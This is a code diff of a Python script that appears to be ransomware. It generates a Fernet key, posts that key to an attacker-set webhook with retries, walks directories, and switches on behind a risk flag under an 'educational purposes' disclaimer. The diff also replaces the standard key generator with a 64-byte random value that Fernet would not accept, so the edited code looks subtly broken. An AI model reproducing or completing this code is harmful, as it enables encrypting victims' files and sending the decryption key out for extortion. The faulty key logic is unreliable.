@@ -1,21 +1,28 @@
-import os
-from cryptography.fernet import Fernet
-from requests import post
-from string import ascii_uppercase
+# -*- coding: utf-8 -*-
 
-# Author: Karbasi
+# Author Karbasi
 
 # The code provided in this repository is for educational and informational purposes only.
 # I do not take any responsibility for any misuse or damage that may result from the use of this code.
 # Use it at your own risk.
-# If you want to run this script change the 0 to 1
-Run_it_at_your_own_RISK = 0
+
+import os
+from cryptography.fernet import Fernet
+from requests import post
+from string import ascii_uppercase
+from base64 import urlsafe_b64encode
+
+Run_it_at_your_own_RISK = 0   # If you want to run this script change the 0 to 1
 webhook = "Your webhook API"  # change this to your webhook API
 
 
-def key_sender(data):
+def generate_key(length: int = 64) -> bytes:
+    return urlsafe_b64encode(os.urandom(length))
+    
+
+def key_sender(data, trys: int = 5):
     # how many tries for sending the key just in case
-    for tries in range(5):
+    for tries in range(trys):
         try:
             post(webhook, data)
             print("[+] Successful sent the key to webhook")
@@ -79,7 +86,7 @@ def windows_walker():
 
 
 if Run_it_at_your_own_RISK != 0:
-    key = Fernet.generate_key()
+    key = generate_key()
     key_sender(key)
     tool = Fernet(key)
     # support for cross-platform
